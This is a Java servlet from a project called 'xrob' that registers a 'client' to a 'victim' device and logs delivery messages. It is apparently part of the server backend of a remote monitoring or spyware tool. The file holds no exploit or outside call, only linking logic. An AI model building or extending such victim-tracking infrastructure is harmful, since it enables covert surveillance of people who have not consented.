package com.theah64.xrob.api.servlets;

import com.theah64.xrob.api.database.tables.ClientVictimRelations;
import com.theah64.xrob.api.database.tables.Clients;
import com.theah64.xrob.api.database.tables.Deliveries;
import com.theah64.xrob.api.models.Delivery;
import com.theah64.xrob.api.utils.APIResponse;

import javax.servlet.annotation.WebServlet;

/**
 * Created by theapache64 on 12/9/16.
 */
@WebServlet(urlPatterns = {AdvancedBaseServlet.VERSION_CODE + "/connect/client_to_victim"}, name = "ConnectClientToVictimServlet")
public class ConnectClientToVictimServlet extends AdvancedBaseServlet {


    @Override
    protected boolean isSecureServlet() {
        return true;
    }

    @Override
    protected String[] getRequiredParameters() {
        return new String[]{Clients.COLUMN_CLIENT_CODE};
    }

    @Override
    protected void doAdvancedPost() throws Exception {

        final String clientCode = getStringParameter(Clients.COLUMN_CLIENT_CODE);
        final String clientId = Clients.getInstance().get(Clients.COLUMN_CLIENT_CODE, clientCode, Clients.COLUMN_ID);
        if (clientId != null) {
            final String victimId = getHeaderSecurity().getVictimId();
            ClientVictimRelations cvr = ClientVictimRelations.getInstance();
            final boolean isAlreadyConnected = cvr.isConnected(clientId, victimId);
            if (!isAlreadyConnected) {
                final boolean isConnected = cvr.connect(clientId, victimId);
                if (isConnected) {
                    Deliveries.getInstance().add(new Delivery(victimId, false, "Client connection established with Client-" + clientId, Delivery.TYPE_OTHER, 0));
                    getWriter().write(new APIResponse("You're CONNECTED!", null).getResponse());
                } else {
                    Deliveries.getInstance().add(new Delivery(victimId, true, "Client connection failed to establish with Client-" + clientId, Delivery.TYPE_OTHER, 0));
                    throw new Exception("Error while establishing the connection!");
                }
            } else {
                Deliveries.getInstance().add(new Delivery(victimId, false, "Client re-connect request with Client-" + clientId, Delivery.TYPE_OTHER, 0));
                throw new Exception("You're already connected to this victim");
            }
        } else {
            throw new Exception("Client doesn't exist with client code : " + clientCode);
        }


    }

}
